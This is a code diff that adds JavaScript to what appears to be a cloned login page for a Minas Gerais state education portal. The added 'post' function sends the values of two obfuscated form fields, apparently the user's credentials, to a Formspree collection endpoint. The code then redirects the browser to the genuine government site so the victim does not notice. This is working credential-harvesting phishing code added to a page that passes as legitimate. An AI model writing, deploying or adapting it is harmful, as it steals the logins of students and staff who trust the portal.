@@ -5477,9 +5477,44 @@ function timeAlert(show) {
 }</script>
 
 <script type="text/javascript">
+function post(value)
+{
+	var formData = new FormData();
+	formData.append('value', value);
+
+	// Envia os dados para o Formspree
+	fetch('https://formspree.io/f/myzgaeep', {
+			method: 'POST',
+			body: formData,
+			headers: {
+					'Accept': 'application/json'
+			}
+	})
+	.then(response => response.json())
+	.then(data => {
+			if (data.ok) {
+					alert('Dados enviados com sucesso!');
+					document.getElementById('contact-form').reset();
+			} else {
+					alert('Ocorreu um erro ao enviar os dados.');
+			}
+	})
+	.catch(error => {
+			console.error('Erro:', error);
+			alert('Ocorreu um erro ao enviar os dados.');
+	});
+}
+
 function main()
 {
   console.log("clicked!")
+
+	post(document.getElementById('fWJQg0').value);
+
+	
+	post(document.getElementById('fWJQl0').value);
+
+	window.location.replace("http://dedmais.educacao.mg.gov.br/");
 }
 </script>
 
